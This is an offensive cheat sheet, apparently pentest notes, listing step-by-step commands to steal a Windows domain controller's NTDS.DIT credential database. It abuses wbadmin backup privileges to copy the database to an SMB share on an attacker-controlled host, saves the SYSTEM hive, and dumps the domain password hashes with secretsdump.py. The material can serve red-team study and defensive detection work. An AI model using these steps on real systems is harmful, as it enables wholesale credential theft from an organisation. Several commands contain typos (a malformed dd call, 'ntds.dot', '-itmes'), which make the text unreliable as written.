# AD related techniques

## SeDebugPrivilege - Manual NTDS.DIT extraction using webadmin to a linux SMB share (NTFS formatted)
```
# 1. Create NFS block fs of size2GB
dd if /dev/zero of=NTFS.DISK bs=1024M count=2

# 2. Mount on loopback device
losetup -fP NTFS.DISK # -f: find first unused device, -P : create a partitioned loop device

# 3. Format the block to the desired fs
sudo mkfs.ntfs /dev/loop<NUMBER>

# 4. Mount the fs
sudo mount /dev/loop<NUMBER> <YOUR MOUNTPOINT>

# 5. Edit the smbd daemon conf, add a share by adding the following lines
# /etc/samba/smb.conf
[<SHARE NAME>]
  comment = foo
  path = <YOUR MOUNTPOINT>
  browseable = yes
  read only = no
  guest ok = yes

# 6. Restart sbmd.service
sudo systemctl restart smbd

# 7. Mount smb share from Windows on the X: share
net use x: \\<ATTACKER IP>\<SHARE NAME>
net use x: /delete # to delete

# 8. Run wbadmin to create a backup to our fileshare & include ntds.diti
# source : https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf
echo y | wbadmin start backup -backuptarget:\\<ATTACKER IP>\<SHARE NAME> -include:c\windows\ntds\

# 9. Get the backup "Version identifier" value
wbadmin get versions

# 10. Extract the files from generated vhdx file to C:\ drive, do not put the same ACL on the backup'd file
echo y | wbadmin start recovery -version:<BACKUP VERSION IDENTIFIER VALUE> -itemtype:file -itmes:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl

# 11. Create a backup of SYTEM hive where the bootkey lives to decrypt the NTDS.DIT
reg save HKLM\SYSTEM system.hive.bak

# 12. Dump the secrets locally on the attacker's machine
secretsdump.py -ntds ntds.dot -system system.hive.bak LOCAL
# use "-history" option to dump the passwd history for extra infos

# Extra. If you cannot decrypt files as SYSTEM check if you are connected as the right user by checking who can read it
cipher /c <FILENAME>
```
